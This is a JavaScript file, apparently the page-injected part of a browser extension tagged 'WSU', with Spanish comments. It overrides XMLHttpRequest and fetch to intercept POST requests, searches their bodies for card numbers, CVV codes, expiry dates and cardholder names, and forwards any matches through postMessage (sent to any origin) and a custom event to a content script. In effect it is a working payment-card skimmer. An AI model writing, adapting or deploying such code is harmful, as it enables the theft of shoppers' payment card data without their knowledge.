// Injected Script - Se ejecuta en el contexto de la página
// Tiene acceso completo a las variables y funciones de la página

(function() {
  'use strict';

  console.log('[WSU] Injected script loaded');

  // Hook para interceptar XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    this._wsu_method = method;
    this._wsu_url = url;
    return originalXHROpen.apply(this, [method, url, ...args]);
  };

  XMLHttpRequest.prototype.send = function(data) {
    if (this._wsu_method === 'POST' && data) {
      try {
        // Intentar parsear el body
        let parsedData = data;
        if (typeof data === 'string') {
          try {
            parsedData = JSON.parse(data);
          } catch (e) {
            // No es JSON, podría ser FormData encoded
          }
        }

        // Buscar datos de tarjeta
        const cardData = searchCardData(parsedData);
        if (cardData) {
          window.postMessage({
            type: 'WSU_CARD_DATA',
            source: 'xhr_intercept',
            url: this._wsu_url,
            data: cardData
          }, '*');
        }
      } catch (e) {
        console.error('[WSU] XHR intercept error:', e);
      }
    }

    return originalXHRSend.apply(this, arguments);
  };

  // Hook para fetch API
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const [url, options] = args;

    if (options && options.method === 'POST' && options.body) {
      try {
        let body = options.body;

        // Parsear body si es string
        if (typeof body === 'string') {
          try {
            body = JSON.parse(body);
          } catch (e) {
            // No es JSON
          }
        }

        const cardData = searchCardData(body);
        if (cardData) {
          window.postMessage({
            type: 'WSU_CARD_DATA',
            source: 'fetch_intercept',
            url: url,
            data: cardData
          }, '*');
        }
      } catch (e) {
        console.error('[WSU] Fetch intercept error:', e);
      }
    }

    return originalFetch.apply(this, args);
  };

  // Buscar datos de tarjeta en objeto
  function searchCardData(obj, depth = 0) {
    if (depth > 5 || !obj) return null;

    const result = {};
    let hasData = false;

    // Patrones de búsqueda
    const patterns = {
      cardNumber: /card.?num|cc.?num|number|pan/i,
      cvv: /cvv|cvc|security|csc/i,
      expiry: /exp|expir/i,
      month: /month|mm/i,
      year: /year|yy/i,
      name: /name|holder/i
    };

    function search(data, prefix = '') {
      if (typeof data === 'object' && data !== null) {
        for (const [key, value] of Object.entries(data)) {
          const fullKey = prefix ? `${prefix}.${key}` : key;

          // Verificar si la key coincide con patrones
          if (patterns.cardNumber.test(key) && typeof value === 'string' && /^\d{13,19}$/.test(value.replace(/\s/g, ''))) {
            result.cardNumber = value;
            hasData = true;
          } else if (patterns.cvv.test(key) && typeof value === 'string' && /^\d{3,4}$/.test(value)) {
            result.cvv = value;
            hasData = true;
          } else if (patterns.expiry.test(key)) {
            result.expiry = value;
            hasData = true;
          } else if (patterns.month.test(key)) {
            result.expiryMonth = value;
            hasData = true;
          } else if (patterns.year.test(key)) {
            result.expiryYear = value;
            hasData = true;
          } else if (patterns.name.test(key) && typeof value === 'string') {
            result.cardholderName = value;
          }

          // Recursivo para objetos anidados
          if (typeof value === 'object' && depth < 5) {
            search(value, fullKey);
          }
        }
      }
    }

    search(obj);
    return hasData ? result : null;
  }

  // Listener para mensajes del content script
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;

    if (event.data.type === 'WSU_CARD_DATA') {
      // Reenviar al content script
      document.dispatchEvent(new CustomEvent('WSU_DATA', {
        detail: event.data
      }));
    }
  });

  console.log('[WSU] Injected script initialized');
})();
